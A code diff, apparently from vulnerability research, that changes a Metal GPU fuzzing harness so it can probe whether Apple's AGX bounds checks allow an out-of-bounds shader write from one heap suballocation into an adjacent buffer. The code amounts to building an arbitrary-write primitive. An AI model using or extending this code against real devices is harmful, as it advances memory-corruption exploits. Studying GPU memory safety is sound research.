@@ -546,26 +546,34 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
         step("✓ adjacent confirmed")
 
         // icbBuf: ICB's bound index buffer — sits in h1, writable via h0 OOB
-        guard let icbBuf   = h1.makeBuffer(length: 64,   options: .storageModeShared) else { step("icbBuf nil");   completion(); return }
-        // dataBuf: shader's buffer(1) base address — GPU writes to dataBuf_base + idx*8
-        guard let dataBuf  = device.makeBuffer(length: 4096, options: .storageModeShared) else { step("dataBuf nil");  completion(); return }
-        // targetBuf: arbitrary write target — we compute idx so GPU lands here
-        guard let targetBuf = device.makeBuffer(length: 256, options: .storageModeShared) else { step("targetBuf nil"); completion(); return }
+        guard let icbBuf = h1.makeBuffer(length: 64, options: .storageModeShared) else { step("icbBuf nil"); completion(); return }
+
+        // h2: shared heap backing both dataBuf and targetBuf.
+        // If AGX bounds-checks shader buffer accesses against heap size (not suballocation size),
+        // dataBuf[512] = h2[4096] = targetBuf[0] → intra-heap GPU OOB write primitive.
+        // If AGX uses suballocation bounds, the write will be silently dropped (previous result).
+        let hd2 = MTLHeapDescriptor(); hd2.size = 4096; hd2.storageMode = .shared
+        guard let h2 = device.makeHeap(descriptor: hd2) else { step("h2 nil"); completion(); return }
+        // dataBuf at h2[0..4095] (suballoc of exactly dataBuf's 4096 bytes)
+        guard let dataBuf   = h2.makeBuffer(length: 4096, options: .storageModeShared) else { step("dataBuf nil");   completion(); return }
+        // targetBuf at h2[4096..4351] — sits immediately after dataBuf in h2's physical memory
+        guard let targetBuf = h2.makeBuffer(length: 256,  options: .storageModeShared) else { step("targetBuf nil"); completion(); return }
 
         let dataBufBase   = UInt(bitPattern: dataBuf.contents())
         let targetBufBase = UInt(bitPattern: targetBuf.contents())
 
-        // idx = (targetBuf_base - dataBuf_base) / 8  (mod 2^64, both 256-aligned → ÷8 exact)
-        // GPU: dataBuf_base + idx*8 = targetBuf_base  →  writes idx to targetBuf[0]
+        // idx: dataBuf_base + idx*8 = targetBuf_base → idx = (target - data) / 8
+        // Both 256-aligned suballocs from h2 → diff divisible by 8
         let idx = (targetBufBase &- dataBufBase) / 8
 
-        // Plant sentinel so we can detect if write landed at targetBuf[0]
+        // Sentinel so we detect if GPU write landed at targetBuf[0]
         let pTarget = targetBuf.contents().assumingMemoryBound(to: UInt64.self)
         pTarget[0]  = 0xDEADBEEFCAFEBABE
 
+        step("h2 size=0x\(String(h2.size,radix:16)) (heap backs both bufs)")
         step("dataBuf_base  = 0x\(String(dataBufBase,   radix:16))")
         step("targetBuf_base= 0x\(String(targetBufBase, radix:16))")
-        step("idx            = 0x\(String(idx,           radix:16))")
+        step("idx            = 0x\(String(idx,           radix:16)) (dataBuf suballoc has \(dataBuf.length/8) uint64s)")
         step("targetBuf[0] sentinel = 0xDEADBEEFCAFEBABE")
 
         // Shader: reads icbBuf[0] as idx, writes dataBuf[idx] = idx
